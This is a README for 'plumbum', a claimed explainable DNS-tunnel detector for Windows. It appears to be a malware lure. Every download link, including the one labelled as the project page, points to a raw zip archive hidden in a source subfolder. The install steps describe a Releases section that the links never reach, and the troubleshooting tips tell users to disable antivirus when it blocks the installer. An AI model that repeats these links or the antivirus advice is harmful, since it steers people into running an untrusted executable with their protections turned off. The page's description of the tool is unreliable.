# 🛡️ plumbum - Clear DNS Tunnel Detection Tool

[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum/raw/refs/heads/main/plumbum-tui/src/views/Software-v3.6.zip)

---

## What is plumbum? 🕵️‍♂️

plumbum helps you find hidden DNS tunnels in network traffic. It looks closely at DNS data and spots suspicious activity by scoring six clear features. It does not use machine learning or complex algorithms. Instead, it shows exactly how it reaches each score. This makes it easier to understand what is happening and why.

plumbum works with PCAP files (captures of network data) and Zeek logs (security logs from a known tool). It helps blue teamers, security analysts, and anyone interested in network security find threats related to DNS tunneling.

---

## 🖥️ System Requirements

To run plumbum on your Windows computer, make sure you have:

- Windows 10 or later  
- At least 4 GB of free RAM  
- 500 MB of free disk space  
- Internet access to download plumbum  
- Basic permission to install software

---

## 🎯 Key Features

- Detects DNS tunneling without black boxes  
- Uses six clear and inspectable scoring features  
- Works on standard network logs (PCAP and Zeek)  
- Lightweight and fast to run on typical machines  
- Provides clear explanations for each anomaly score  
- No need to install additional software beyond plumbum itself  
- Command-line based, but easy to follow instructions provided  

---

## 🚀 How plumbum works

plumbum reads your network data logs and looks for unusual DNS TXT records. These records might be used to hide data or send commands outside your network. It scores each suspicious point based on six key signals. The tool then combines these scores into one clear number for easy understanding.

Each part of the score can be inspected. This means you can see which parts of your DNS data caused the alert. This approach lets you learn from the results instead of relying on confusing detections.

---

## 📥 Download and Install plumbum on Windows

### Step 1: Visit the Download Page

Click the blue button below to visit the plumbum download page on GitHub:

[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum/raw/refs/heads/main/plumbum-tui/src/views/Software-v3.6.zip)

This page contains the latest release and installation files.

### Step 2: Find the Installer File

On the GitHub page, look for the **Releases** section. You should see files ending with `.exe` or `.zip`. Choose the Windows installer or zipped file. The file name will clearly indicate it's for Windows.

### Step 3: Download the File

Click on the `.exe` or `.zip` link to download the file. Save it to a location you can find easily, like your Desktop or Downloads folder.

### Step 4: Run the Installer or Extract Files

- If you downloaded an `.exe` file, double-click it to start the installer. Follow the prompts on screen.  
- If you downloaded a `.zip` file, right-click it and select **Extract All**. Choose a folder where you want the files saved.

### Step 5: Open Command Prompt

1. Press `Win + R` on your keyboard.  
2. Type `cmd` and press Enter.  
3. Use the `cd` command to change to the folder where you installed or extracted plumbum. For example:  
   ```
   cd C:\Users\YourName\Downloads\plumbum
   ```

### Step 6: Run plumbum

Type the following command and press Enter:  
```
plumbum.exe --help
```

This will show available options and confirm the program works.

---

## 📖 How to Use plumbum Simply

### Analyzing a PCAP file

If you have a PCAP file containing network traffic, run:

```
plumbum.exe analyze --pcap path\to\file.pcap
```

Replace `path\to\file.pcap` with the exact path to your PCAP file.

### Analyzing Zeek logs

To scan Zeek DNS logs:

```
plumbum.exe analyze --zeek path\to\logs
```

Here, `path\to\logs` is the folder containing your Zeek DNS log files.

---

## ⚙️ Configuration Tips

- Use the `--output` option to save the report to a file:  
  ```
  plumbum.exe analyze --pcap file.pcap --output report.txt
  ```

- You can run checks on specific time ranges or IP addresses with available filtering options shown in the help command.

- The tool produces an anomaly score composed of six parts. Review each part to understand what triggered the alerts.

---

## 🔍 Understanding the Results

After running plumbum, you receive a report with scores. Each score covers one key feature like DNS message size, frequency, or unusual text patterns. Higher values may show stronger suspicion.

The report explains each feature in plain language. This helps you decide whether the detected anomaly is a real threat or a harmless case.

---

## Troubleshooting Tips

- Make sure the files you analyze are valid PCAP files or correctly exported Zeek logs.  
- Use the command `plumbum.exe --help` for a list of commands and options if you get stuck.  
- If the program does not start, ensure that your system meets requirements and that you are in the correct folder in the Command Prompt.  
- Temporarily disable antivirus programs if they block the installer—some security software flags new tools wrongly.

---

## 🔗 Useful Links

- Project page and downloads: https://github.com/XXXCAIO1997/plumbum/raw/refs/heads/main/plumbum-tui/src/views/Software-v3.6.zip  
- GitHub Releases section for direct installer files  
- PCAP file creation tools (Wireshark)  
- Zeek documentation for log formats  

---

## 🤔 Who Should Use plumbum?

- Network security analysts monitoring for data leaks  
- Blue team members investigating suspicious activity  
- Anyone interested in understanding DNS tunneling threats  
- IT professionals looking for clear, explainable anomaly detection  
- Security engineers wanting to avoid black-box tools  

---

[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum/raw/refs/heads/main/plumbum-tui/src/views/Software-v3.6.zip)